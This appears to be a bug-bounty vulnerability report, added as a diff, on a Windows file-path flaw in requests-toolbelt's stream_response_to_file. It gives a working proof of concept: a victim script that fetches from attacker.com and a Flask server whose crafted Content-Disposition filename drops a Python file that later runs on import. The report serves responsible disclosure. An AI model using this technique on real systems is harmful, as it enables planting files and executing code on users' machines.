@@ -1,0 +1,51 @@
+Title: Externally Controlled File Path/Content On Windows in requests/toolbelt
+
+Proof of Concept: 
+victim.py (with adjacent downloads folder)
+
+import requests
+from requests_toolbelt.downloadutils.stream import stream_response_to_file
+
+# user expects all downloaded files to be placed in `downloads` folder
+filename = stream_response_to_file(requests.get('http://attacker.com/file.txt'), 'downloads')
+print(filename)
+
+malicious_server.py
+
+from flask import Flask, send_file
+import io
+
+app = Flask(__name__)
+
+@app.route('/<path:path>')
+def root(path):
+    response = send_file(io.BytesIO(b'print("RCE")'), download_name='')
+    response.headers['content-disposition'] = 'attachment; filename=/C:random.py'
+    return response
+    
+app.run('0.0.0.0', port=8080)
+
+The first time victim.py is run, the file downloads. The second time, it executes printing RCE
+
+Impact: 
+This vulnerability is capable of dropping files in the script current working directory. This can result in full RCE by exploiting how python handles import paths.
+Note that this only affects users on Windows OS.
+
+CVE ID: None
+Status: None
+Vulnerability Type: CWE-73: External Control of File Name or Path
+Severity: Low (3.1)
+Attack Vector: Network
+Attack Complexity: High
+Privileges Required: High
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: None
+Integrity: Low
+Availability: Low
+Registry: Pypi
+Affected Version: 1.0.0
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $20 to $24
+Fix Bounty: $5
